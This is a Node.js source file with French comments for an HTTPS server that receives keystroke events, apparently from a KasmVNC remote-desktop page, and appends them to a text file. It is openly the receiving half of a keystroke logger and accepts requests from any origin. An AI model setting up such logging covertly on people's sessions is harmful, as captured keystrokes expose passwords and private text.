// keylog_server.js (HTTPS + CORS)
// Écrit /tmp/keystrokes.txt ; écoute : https://0.0.0.0:3000
const fs = require('fs');
const os = require('os');
const https = require('https');
const path = require('path');
const url = require('url');

const OUT = '/tmp/keystrokes.txt';
const HOST = '0.0.0.0';   // publié via -p 3000:3000
const PORT = 3000;

// On réutilise les certs auto-signés de KasmVNC si présents (sinon on en génère au build)
const CERT_DIRS = [
  '/home/kasm-user/.vnc',        // KasmVNC self.pem souvent ici
  '/etc/ssl/kasmvnc',            // fallback éventuel
  '/etc/ssl'                     // dernier recours
];

// Trouver une paire key/cert
function loadTLS() {
  // 1) self.pem combiné
  for (const d of CERT_DIRS) {
    const pem = path.join(d, 'self.pem');
    if (fs.existsSync(pem)) {
      const pemData = fs.readFileSync(pem);
      return { key: pemData, cert: pemData };
    }
  }
  // 2) paire key/cert séparée (si tu les fournis au build)
  const k = '/etc/ssl/private/server.key';
  const c = '/etc/ssl/certs/server.crt';
  if (fs.existsSync(k) && fs.existsSync(c)) {
    return { key: fs.readFileSync(k), cert: fs.readFileSync(c) };
  }
  throw new Error('TLS cert introuvable. Fourni self.pem ou server.key/crt au build.');
}

function appendLines(lines) {
  fs.appendFileSync(OUT, lines + os.EOL, { encoding: 'utf8' });
}

const tls = loadTLS();

const server = https.createServer(tls, (req, res) => {
  const origin = req.headers.origin || '';
  const u = url.parse(req.url).pathname;

  // CORS permissif depuis la page KasmVNC (6901)
  if (req.method === 'OPTIONS') {
    res.writeHead(204, {
      'Access-Control-Allow-Origin': origin,
      'Access-Control-Allow-Methods': 'POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type',
      'Access-Control-Max-Age': '600',
    });
    return res.end();
  }

  if (req.method === 'POST' && u === '/log') {
    let body = '';
    req.on('data', (chunk) => { body += chunk.toString(); });
    req.on('end', () => {
      try {
        const j = JSON.parse(body);
        if (Array.isArray(j.entries)) {
          const lines = j.entries.map(e =>
            `[${e.ts}] key=${e.key} code=${e.code} ctrl=${!!e.ctrl} alt=${!!e.alt} shift=${!!e.shift} repeat=${!!e.repeat}`
          ).join('\n');
          appendLines(lines);
        } else {
          appendLines(`[${new Date().toISOString()}] INVALID_PAYLOAD ${body}`);
        }
      } catch (err) {
        appendLines(`[${new Date().toISOString()}] JSON_ERROR ${err.message}`);
      }
      res.writeHead(200, {
        'Content-Type': 'text/plain',
        'Access-Control-Allow-Origin': origin,
      });
      res.end('OK');
    });
    return;
  }

  res.writeHead(404, {
    'Content-Type': 'text/plain',
    'Access-Control-Allow-Origin': origin,
  });
  res.end('Not found');
});

server.listen(PORT, HOST, () => {
  console.log(`Keylog server on https://${HOST}:${PORT} → ${OUT}`);
});
